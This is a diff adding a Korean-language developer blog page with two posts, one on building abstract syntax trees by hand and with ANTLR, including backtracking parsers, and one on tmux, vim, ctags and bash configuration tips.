+<h3>Building AST</h3>
+
+<p>ANTLR 를 사용하지 않고, 손으로 AST 를 만들어보았다.</p>
+
+<p>AST 는 Homogeneous AST / Normalized Heterogeneous AST / Irregular Heterogeneous AST 정도로
+나눌 수 있는데, 간단한 Homogeneous AST 를 만들어 보았다.</p>
+
+<p>Recursive 하게 decent 하는 파서의 특성을 활용하면, <code>AST.addChild(parent, int astType, Token token)</code>
+정도의 콜을 적절히 달아주는 것으로 트리 빌딩이 가능하다.</p>
+
+<pre><code>public class AST {
+    Token token;
+    List&lt;AST&gt; children;
+    public AST(Token token) { this.token = token; }
+    public void addChild(AST t) { 
+        if (children == null) children = new ArrayList&lt;AST&gt;();
+        children.add(t);
+    }
+}
+</code></pre>
+
+<p>일단 하나의 클래스로 모든 노드를 담는다.
+하나의 타입만 있으니까, children 을 <code>List&lt;AST&gt; children</code> 으로 관리할 수 있다.
+AST 를 만들기 위해, 3 lookaheads 를 사용하였다.</p>
+
+<pre><code>$ java Test '[1,x=2,[3,4]]'
+match LBRACK
+match NAME
+match COMMA
+match NAME
+match EQUALS
+match NAME
+match COMMA
+match LBRACK
+match NAME
+match COMMA
+match NAME
+match RBRACK
+match RBRACK
+AST Type: AST_ROOT
+    AST Type: AST_LIST
+        AST Type: AST_NAME
+            Token: NAME : 1
+        AST Type: AST_ASSIGN
+            AST Type: AST_IDENTIFIER
+                Token: NAME : x
+            AST Type: AST_VALUE
+                Token: NAME : 2
+        AST Type: AST_LIST
+            AST Type: AST_NAME
+                Token: NAME : 3
+            AST Type: AST_NAME
+                Token: NAME : 4
+</code></pre>
+
+<h3>Building AST with ANTLR</h3>
+
+<p>벡터 계산에 관한 문법을 만들고, ANTLR 를 가지고 AST 를 build 한다.</p>
+
+<pre><code>x = 1+2
+y = 1*2+3
+z = [1,2] + [3,4]
+a = [1,2] . [3,4]
+b = 3 * [1,2]
+print x+2
+
+statline : stat+ ;
+stat: ID '=' expr | 'print' expr ;
+expr: multExpr ('+' multExpr)* ; // E.g., "3*4 + 9"
+multExpr: primary (('*'|'.') primary)* ;
+primary : INT | ID | '[' expr (',' expr)* ']'
+</code></pre>
+
+<p>우선 <code>output=AST;</code> 로 AST 를 빌드 모드로.</p>
+
+<pre><code>grammar VecMathAST;
+options {output=AST;}
+tokens {VEC;}
+</code></pre>
+
+<p>그리고 기존 문법에 AST rewrite 를 위한 규칙을 추가한다. 예를 들어</p>
+
+<pre><code>statlist : stat+ ;
+stat: ID '=' expr
+</code></pre>
+
+<p>같은 경우 <code>stat: ID '=' expr</code> 에 AST rewrite 규칙을 추가한다.</p>
+
+<pre><code>statlist : stat+ ;
+stat: ID '=' expr -&gt; ^('=' ID expr)
+</code></pre>
+
+<p><code>^('=' ID expr)</code> 은, <code>'='</code> 가 subtree 의 root 고, <code>ID</code>, <code>expr</code> 가 children 으로,
+AST 를 구성하라는 rewriting rule 이 된다.</p>
+
+<p>Antlr 의 AST rewriting 을 이해하기 위해 참조한 블로그는 <a href="http://bkiers.blogspot.kr/2011/03/5-building-ast.html">Bart&rsquo;s Blog</a> 임.</p>
+
+<pre><code>bar : A B C D -&gt; ^(B A C) ;
+</code></pre>
+
+<p>을 하면, B 가 root 가 되고, A, C 가 children 이 되고, D 는 없어진다.</p>
+
+<p>다른 예.</p>
+
+<pre><code>addExpr : multiplyExpr (('+' | '-') multiplyExpr)* ;
+
+addExpr : multiplyExpr (('+' | '-')^ multiplyExpr)* ;
+</code></pre>
+
+<p>을 하면, &lsquo;+&rsquo;, &lsquo;-&rsquo; 가 root 가 되고 multiplyExpr 2 개가 children 이 된다.</p>
+
+<p>root 로 할만한 적당한 녀석이 없을 경우에는 하나 만들면 된다.</p>
+
+<pre><code>block : (statement | funcitonDecl)* (Return expression ';')? ;
+
+block : 
+    (statement | functionDecl)* (Return expression ';')?
+        -&gt; ^(BLOCK ^(STATEMENTS statement*) ^(RETURN expression?))
+    ;
+</code></pre>
+
+<p>을 하면, 모든 block 은 STATEMENTS, RETURN 이라는 2 개의 children 을 가지게 된다.</p>
+
+<p>본격적으로 AST rewriting rule 을 추가하면,</p>
+
+<pre><code>// START: header
+grammar VecMathAST;
+options {output=AST;} // we want to create ASTs
+tokens {VEC;} // define imaginary token for vector literal
+// END: header
+
+// START: stat
+statlist : stat+ ;                    // builds list of stat trees
+stat: ID '=' expr  -&gt; ^('=' ID expr)  // '=' is operator subtree root
+    | 'print' expr -&gt; ^('print' expr) // 'print' is subtree root
+    ;
+// END: stat
+
+// START: expr
+expr:   multExpr ('+'^ multExpr)* ;        // '+' is root node
+multExpr: primary (('*'^|'.'^) primary)* ; // '*', '.' are roots
+primary
+    :   INT   // automatically create AST node from INT's text
+    |   ID    // automatically create AST node from ID's text
+    |   '[' expr (',' expr)* ']' -&gt; ^(VEC expr+)
+    ;
+// END: expr
+
+ID  :   'a'..'z'+ ;
+INT :   '0'..'9'+ ;
+WS  :   (' '|'\r'|'\n')+ {skip();} ;
+</code></pre>
+
+<h3>Parse Tree</h3>
+
+<p>AST 와 Parse Tree 의 차이점이 <a href="http://stackoverflow.com/questions/5026517/whats-the-difference-between-parse-tree-and-ast">What&rsquo;s the difference between parse tree and AST?</a> 에 정리되어 있다.</p>
+
+<pre><code>The AST only contains all 'useful' elements that will be used for further processing,
+while the parse tree contains all the artifacts (spaces, brackets, ...)
+from the original document you parse
+</code></pre>
+
+<h3>Backtracking Parser &amp; Memoizing Parser</h3>
+
+<p>LL(k) 파서로 판단하기 어려운 모호성이 존재할 때, 쓰는 기법.</p>
+
+<pre><code>The easiest way to implement a backtracking strategy for a parsing
+decision is to speculatively attempt the alternatives in order until we
+find one that matches. Upon success, the parser rewinds the input and 
+parses the alternative normally. Upon failing to match an alternative,
+the parser rewinds the input and tries the next one. If the parser can't 
+find any matching alternative, it throws a "no viable alternative" 
+exception.
+</code></pre>
+
+<p>다음과 같은 문법을 보자. Python 과 같이 <code>[a,b] = [c,d]</code> 와 같은 리스트 어사인을 지원하는 문법이다.</p>
+
+<pre><code>stat    : list EOF | assign EOF ;
+assign  : list '=' list ;
+list    : '[' elements ']' ;
+elements    : element (',' element)* ;
+element     : NAME '=' NAME | NAME | list
+</code></pre>
+
+<p>stat 의 경우, list 인지 assign 인지 정하기 위해서는 리스트를 파싱하고 나서, 토큰 하나를 더 봐야
+알 수 있다.</p>
+
+<p>얼터너티브를 시도해보면서, 경우에 따라 백트래킹하는 코드.</p>
+
+<pre><code>public void statement() throws RecognitionException {
+    if ( speculate_stat_alt1() ) { list(); match(Lexer.EOF_TYPE); }
+    else if ( speculate_stat_alt2() ) { assign(); match(Lexer.EOF_TYPE); }
+    else throw new NoViableAltException("expecting stat found " + LT(1));
+}
+
+public boolean speculate_stat_al1() {
+    boolean success = true;
+    mark();
+    try { list(); match(Lexer.EOF_TYPE); }
+    catch (RecognitionException e) { success = false; }
+    release();
+    return success;
+}
+public boolean speculate_stat_al2() {
+    boolean success = true;
+    mark();
+    try { assign(); match(Lexer.EOF_TYPE); }
+    catch (RecognitionException e) { success = false; }
+    release();
+    return success;
+}
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/06/12/tmux-pane-setting/">Tmux Pane Setting</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-06-12T20:02:00+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>8:02 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>tmux 와 vimrc 에 몇가지를 추가했는데.</p>
+
+<h3>tmux</h3>
+
+<p>pane 을 vi key 로 옮겨다니기 위해서</p>
+
+<pre>
+unbind j
+unbind k
+unbind h
+unbind l
+bind j select-pane -D
+bind k select-pane -U
+bind h select-pane -L
+bind l select-pane -R
+</pre>
+
+
+<p>를 해서 자판에서 손을 안떼고 움직일 수 있게 하였다.</p>
+
+<p>그리고,</p>
+
+<pre>
+bind / command-prompt "split-window 'exec %%'"
+</pre>
+
+
+<p>를 추가해서 간단한 shell command 를 tmux 안에서 날릴 수 있게 하였다.</p>
+
+<p>C-a / 를 누르고 ping localhost 를 때리면, pane 이 하나 열리고 ping 이 실행된다.</p>
+
+<pre><code>bind a send-prefix
+</code></pre>
+
+<p>로 Ctrl-a a 로 Ctrl-a 기능을 살린다. Ctrl-a / Ctrl-e / Ctrl-b 등의 Emacs 스타일 cursor moving 을 자주 쓴다면 필요.</p>
+
+<p>그리고 tmux 가 최근에 1.8 로 업글되었다.
+Ubuntu 의 경우 패키지로 아직 repo 에 안올라와서, source 를 컴파일해야 한다.
+OS X 의 경우 brew 에 1.8 패키지가 올라왔다. <code>brew install tmux</code> 또는 <code>brew upgrade tmux</code> 하면 된다.
+1.8 의 큰 장점은 pane zoom 이 된다는 것. 그 전까지는 꽁수로 했었는데, 이제는 native 하게 된다.
+<code>Ctrl-a z</code> 로 zoom 을 토글할 수 있다. 줌기능 대박이다.</p>
+
+<p>Ubuntu 에서 tmux 카피 버퍼와 OS 클립보드를 통합하는 방법:</p>
+
+<pre><code>$ sudo apt-get install xclip
+
+bind C-c run "tmux save-buffer - |xclip -i -sel clipboard"
+bind C-v run "tmux set-buffer \"$(xclip -o -sel clipboard)\"; tmux paste-buffer"
+</code></pre>
+
+<p>OS X 에서 통합하는 방법:</p>
+
+<pre><code>$ git clone https://github.com/ChrisJohnsen/tmux-MacOSX-pasteboard.git
+$ cd tmux-MacOSX-pasteboard
+$ make reattach-to-user-namespace
+$ mv reattach-to-user-namespace /usr/local/bin
+$ export PATH="/usr/local/bin:$PATH"
+
+set -g default-command "reattach-to-user-namespace -l /bin/zsh"
+bind C-c run "tmux save-buffer - | reattach-to-user-namespace pbcopy"
+bind C-v run "tmux set-buffer $(reattach-to-user-namespace pbpaste); tmux paste-buffer"
+</code></pre>
+
+<p>이제 C-a C-c 로 tmux buffer -> OS X clipboard 로 카피할 수 있다.</p>
+
+<h3>vim</h3>
+
+<p>만약 Solarized 를 안쓴다면, TabLine 을 바꾸는 것이 좋다.</p>
+
+<p>.vimrc 에</p>
+
+<pre>
+hi TabLineSel ctermfg=Red ctermbg=Yellow
+hi TabLine ctermfg=Blue ctermbg=Yellow
+hi TabLineFill ctermfg=LightGreen ctermbg=DarkGreen
+</pre>
+
+
+<p>ftplugin 으로 안하고, 그냥 .vimrc 에 때려박은 것들이 있는데,</p>
+
+<pre><code>autocmd FileType python set sts=4|set sw=4|set expandtab
+autocmd FileType ruby set sts=2|set sw=2|set expandtab
+</code></pre>
+
+<p>나중에 filetype plugin 으로 정리할 생각.</p>
+
+<p>사람들이 잘 모르는 것이 sts 와 ts 와 sw 의 차이.</p>
+
+<p>expandtab 을 할 경우에는 ts 를 할 필요없이 sts 만 해줘도 된다.</p>
+
+<p>그리고</p>
+
+<pre>
+noremap &lt;CR> :
+</pre>
+
+
+<p>를 했는데.</p>
+
+<p>ESC : 로 커맨드모드를 진입하면 : 를 누를때 SHIFT 를 같이 눌러야해서,
+손이 아팠는데, 이제는 ESC ENTER 로 커맨드모드 진입이 가능해진다.</p>
+
+<p>손이 한결 편해진다.</p>
+
+<h4>10 J</h4>
+
+<p>그리고 vim 에서 흔히 텐제이라고 부르는 매핑.</p>
+
+<pre>
+map &lt;C-j> 10j
+map &lt;C-k> 10k
+</pre>
+
+
+<p>로 빠르게 상하이동이 가능하다. Ctrl + J / Ctrl + K</p>
+
+<h4>Indentation</h4>
+
+<p>Code indentation 은 visual mode 에서 &lt; &lt; 로 할 수 있는데, 좀 더 편하게 하기 위해서
+visual mode non-recursive mapping 을 추가한다.</p>
+
+<pre><code>vnoremap &lt; &lt;gv
+vnoremap &gt; &gt;gv
+</code></pre>
+
+<p>이렇게 하면, Visual mode 에서 &lt; 를 연속으로 눌러 indentation 을 들이거나 낼 수 있다.
+파이썬같이 인덴테이션이 중요한 언어에서는 꼭 필요한 매핑이다.</p>
+
+<p>vim 팁으로는,</p>
+
+<p>코드 인덴팅할때, 편리한 vim 커맨드.</p>
+
+<pre>
+5&lt;&lt;
+Vjj&lt;
+&lt;%
+]p
+</pre>
+
+
+<h4>.vimrc</h4>
+
+<pre><code>nnoremap &lt;leader&gt;ev :vsplit $MYVIMRC&lt;cr&gt;
+</code></pre>
+
+<p>하면 편하게 .vimrc 를 에디팅할 수 있다.</p>
+
+<h4>Rails</h4>
+
+<p>Rails 를 사용한다면, route 화일이나 DB 스키마를 에디트할 경우가 많다. 그래서 다음 매크로가 유용하다.</p>
+
+<pre><code>command! Rroutes :e config/routes.rb
+command! Rschema :e db/schema.rb
+</code></pre>
+
+<h4>Vim Plugin</h4>
+
+<p>vim plugin 중에서는 Command-T, Solarized, YouCompleteMe, Taglist 를 사용.</p>
+
+<p>Taglist 를 쓸 경우, .vimrc 에 (OS X 에서 brew 로 Exuberant ctags 를 깔았을 경우)</p>
+
+<pre><code>nnoremap &lt;silent&gt; &lt;F8&gt; :TlistToggle&lt;CR&gt;
+let Tlist_Ctags_Cmd='/usr/local/Cellar/ctags/5.8/bin/ctags'
+</code></pre>
+
+<p><F8> 로 클래스/함수 pane 을 on/off 시킬 수 있다.</p>
+
+<p>YouCompleteMe 때문에, OS X 에서는 MacVim 에 딸려오는 Vim 을 사용한다 (nogui). 만약 SIGSEGV 가 발생하면, 아마 python library 가 잘못 링크되었을 경우인데, 임시로 brew unlink python 으로 python 라이브러리 쫑나는 것 해결할 수 있다.</p>
+
+<p>MacVim 은 <a href="http://github.com/b4winckler/macvim/downloads">여기서</a> 다운받아 컴파일한다.</p>
+
+<p>Ubuntu 에서는 ruby 와 python 써포트를 On 하고, 링크되는 라이브러리에 신경을 써서 새로 컴파일하는 것이 좋다. 12.04 에 딸려오는 vim 이 너무 구식이라.</p>
+
+<p>OS X iTerm2 터미널도 Solarize 할 수 있는 스크립이 찾아보면 있으니. <a href="altercation/solarized/iterm2-colors-solarized">https://github.com/altercation/solarized</a></p>
+
+<p>그리고, Linux gnome 의 경우도 github 에 <a href="sigurdga/gnome-terminal-colors-solarized">https://github.com/sigurdga/gnome-terminal-colors-solarized</a> 로 찾으면 나옴.</p>
+
+<p>vim colorscheme 만 solarized 를 쓰면 terminal 로 돌아올때 번쩍해서 눈이 피곤하다. 둘 다 맞춰주는 것이 좋다.</p>
+
+<p>Command-T 를 설치할 때, Linux 는 간단한데, OS X 는 약간 까다롭다.</p>
+
+<p>$ vim &ndash;version 으로 vim 컴파일에 사용된 FLAG 랑 맞춰주는 것이 기본인데,
+OS X Mountain Lion 에서는
+처음에 아무생각없이 build 했다가 SIGSEGV 이 발생해서,</p>
+
+<pre>
+vim --version|grep arch
+vim --version|grep ruby
+ARCHFLAGS="-arch x86_64"
+rbenv local system 
+ruby --version
+ruby extconf.rb
+make
+</pre>
+
+
+<p>rbenv 로 /usr/bin/ruby 가 실행되게 하는 것.
+ruby 버전이 1.8.7 인지 확인하는 것.
+vim 이 컴파일된 아키텍쳐와 루비 써포트를 확인하는 것.</p>
+
+<p>vim 이 +ruby 가 아니라면, <a href="http://stackoverflow.com/questions/3794895/installing-vim-with-ruby-support-ruby">Installing vim with ruby support (+ruby)</a> 참조.</p>
+
+<p>15 인치 노트북에서 화면 가득한 iTerm 을 띄워놓고,
+vim window + vim tab + tmux pane + tmux screen 을 활용하면,
+마우스나 트랙패드를 사용할 필요가 없다.</p>
+
+<p>iTerm 과 크롬을 한개씩 띄워놓고 개발이 가능해진다.</p>
+
+<p>CMD-TAB 과 크롬 단축기를 사용하면, 키보드에서 손을 뗄 필요가 없어진다.</p>
+
+<p>참고로 iTerm 의 경우 CMD+OPTION+1 등으로 윈도우를 선택할 수 있다.</p>
+
+<h4>Vim Key Mapping</h4>
+
+<p>그리고 vim key mapping 에 관한 좋은 글
+Mapping keys in Vim - Tutorial -
+<a href="http://vim.wikia.com/wiki/Mapping_keys_in_Vim_-_Tutorial_(Part_1)">here</a></p>
+
+<p>vim 으로 hex edit 하는 법</p>
+
+<pre><code>:%!xxd
+:%!xxd -r
+</code></pre>
+
+<p>다량의 Tab 을 열어놓고 작업하다가 한꺼번에 닫고 나갈때,</p>
+
+<pre><code>:qa
+:wqa
+</code></pre>
+
+<p>하면 된다.</p>
+
+<h3>irb</h3>
+
+<p>ruby 를 사용하면 irb 를 많이 쓰게되는데, irb 에서 vi key 를 쓰는 방법.</p>
+
+<pre><code>$ vim ~/.editrc
+bind -v
+bind \\t rl_complete
+</code></pre>
+
+<p>이렇게 하면 ESC i j k l 등으로 이동할 수 있고, TAB 으로 completion 을 할 수 있다.</p>
+
+<p>python REPL 에서도 먹는다. Emacs 스타일보다 Vim 스타일이 더 편하다.</p>
+
+<h3>ctags &amp; cscope</h3>
+
+<p>Python 코딩은 OS X 보다는 Linux 에서 작업하는데,</p>
+
+<pre><code>sudo apt-get install ctags 
+</code></pre>
+
+<p>~/.ctags 에다가</p>
+
+<pre><code>--python-kinds=-i
+</code></pre>
+
+<p>그리고 .vimrc 에다가</p>
+
+<pre><code>set tags=./mytags
+</code></pre>
+
+<p>그리고</p>
+
+<pre><code>ctags -R -o ./mytags ~/code
+</code></pre>
+
+<p>를 해두면,</p>
+
+<p>vim 에서,</p>
+
+<pre><code>vim -t &lt;tag name&gt;
+Ctrl-] / Ctrl-T
+:tselect / :stselect
+:tnext / :tprev
+:help tags
+</code></pre>
+
+<p>으로 tag 들을 navigating 할 수 있다.</p>
+
+<p>그리고 ctags v.s. cscope 에 관한 좋은 글 <a href="http://stackoverflow.com/questions/934233/cscope-or-ctags-why-choose-one-over-the-other">cscope or ctags why choose one over the other?</a></p>
+
+<p>그리고, OS X 에서 Exuberant ctags 를 사용해서 python 등을 코딩하고 싶다면,
+Homebrew 를 사용해 인스톨한다. 오리지널 ctags 는 /usr/bin/ctags 에 있을 것이고,
+새로 인스톨된 것은 /usr/local 아래 어딘가 있을 듯.</p>
+
+<pre><code>$ brew install ctags-exuberant
+</code></pre>
+
+<p>/usr/local/bin/ctags 가 실행되도록 확인하고, 마찬가지로 ~/.ctags 에</p>
+
+<pre><code>--python-kinds=-i
+</code></pre>
+
+<p>추가.</p>
+
+<p>ctags 에 관한 좋은 블로그 <a href="http://www.scholarslab.org/research-and-development/code-spelunking-with-ctags-and-vim/">Code Spelunking with Ctags and Vim</a></p>
+
+<p>그리고 pycscope 을 쓸수도 있는데,</p>
+
+<p>OS X 에서는 <code>brew install cscope</code> 해주고, cscope_maps.vim 을 ~/vim/plugin 아래에 설치한다.
+그리고 pycscope 도 설치한다. <code>pycscope -R .</code> cscope_maps.vim 도 추가.</p>
+
+<p><a href="http://cscope.sourceforge.net/cscope_vim_tutorial.html">The Vim/Cscope tutorial</a></p>
+
+<p>개인적으로는 cscope 이 ctags 보다 편하다.</p>
+
+<p><code>Ctrl-\</code>+<code>c</code> 나 <code>Ctrl-\</code>+<code>s</code> 그리고, <code>Ctrl-\</code>+<code>d</code></p>
+
+<h3>ack &amp; z jumper</h3>
+
+<p>ack 가 grep 보다 소스코드에서 뭐 찾을때 훨 편하다.</p>
+
+<p>그리고 디렉토리 navigation 은 z jumper 가 최고다. 예전의 노턴 ncd 같은 녀석.</p>
+
+<h3>bash</h3>
+
+<p>스크린캐스트에서 본 쉘 커맨드.</p>
+
+<pre><code>~/code/jade[master]% find . -iname "*.rb" | 
+xargs grep -h '^[[:space:]]*class\|module\b' | 
+sed 's/^[[:space:]]*//' | grep -v '^#' | cut -d ' ' -f 2 | 
+while read class; 
+do echo `grep -rl "\b$class\b" app lib --include "*.rb" |wc -l` $class ; 
+done | sort -n
+</code></pre>
+
+<p>한 줄이다. ruby 의 클래스를 참조하는 화일 갯수를 세는건데.</p>
+
+<ul>
+<li>grep -l 옵션은 화일에서 패턴 존재가 확인되면 그냥 스킵. 존재 여부를 확인할때.</li>
+<li>grep -r 은 디렉토리 리커시브.</li>
+<li>grep -v 는 패턴이 없는 라인을 출력.</li>
+<li>grep -h 는 화일 이름을 출력 안함.</li>
+<li>find &hellip; | xargs 가 find &hellip; -exec 보다 빠르다.</li>
+<li>sort -n 은 numerical sort 를 하란 것인데, 그냥 sort 하면 &ldquo;10&rdquo; 이 &ldquo;2&rdquo; 보다 앞에 나온다. -n 을 해주면 &ldquo;2&rdquo; 가 &ldquo;10&rdquo; 보다 먼저 나오게 된다.</li>
+</ul>
+
+
+<h3>zsh</h3>
+
+<p>zsh 에서는 Global alias 이용해</p>
+
+<pre><code>alias -g G='|grep '
+</code></pre>
+
+<p>하면</p>
+
+<pre>
+cat log G ERROR
+</pre>
+
+
+<p>와 같은 커맨드가 가능하다.</p>
+
+<h3>bash I/O redirection</h3>
+
+<p><a href="http://www.cyberciti.biz/faq/bash-while-loop/">Bash While Loop Example</a> 에서.</p>
+
+<pre><code>cmd &gt;&gt;file.txt 2&gt;&amp;1
+</code></pre>
+
+<p> stderr, stdout 을 함께 화일에 append 할 때.</p>
+
+<pre><code>#!/bin/bash
+FILE=$1
+exec 3&lt;&amp;0
+exec 0&lt;$FILE
+while read line
+do
+  echo $line
+done
+exec 0&lt;&amp;3
+</code></pre>
+
+<p> stdin 을 3 에 카피해놓고, 화일을 stdin 으로 돌리고, 나중에 원복.</p>
+
+<pre><code>#!/bin/bash
+x=1
+while [ $x -le 5 ]
+do
+  echo "$x times"
+  x=$(( $x + 1 ))
+done
+</code></pre>
+
+<p>bash 의 arithmetic operator 는 (( )) 이다.</p>
+
+<pre><code>#!/bin/sh
+counter=$1
+factorial=1
+while [ $counter -gt 0 ]
+do
+  factorial=$(( $factorial * $counter ))
+  counter=$(( $counter - 1 ))
+done
+echo $factorial
+</code></pre>
+
+<p>factorial 구하는 것.</p>
+
+<pre><code>#!/bin/sh
+while :
+do
+  read -p "Enter two numbers ( -1 to quit ) : " a b
+  if [ $a -eq -1 ]
+  then
+    break
+  fi
+  ans=$(( a + b ))
+  echo $and
+done
+</code></pre>
+
+<p>읽을만한 shell scripting 문서: <a href="http://bash.cyberciti.biz/guide/Main_Page">Linux Shell Scripting Tutorial (LSST) v2.0</a></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/posts/19">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/posts/17">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/10/02/the-inside-story-behind-ms08-067/">The Inside Story Behind MS08-067</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/17/rop-and-arm/">ROP and ARM</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/sophail-applied-attacks-against-sophos-antivirus/">Sophail: Applied Attacks Against Sophos Antivirus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/stagefright/">Stagefright</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Your Name -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
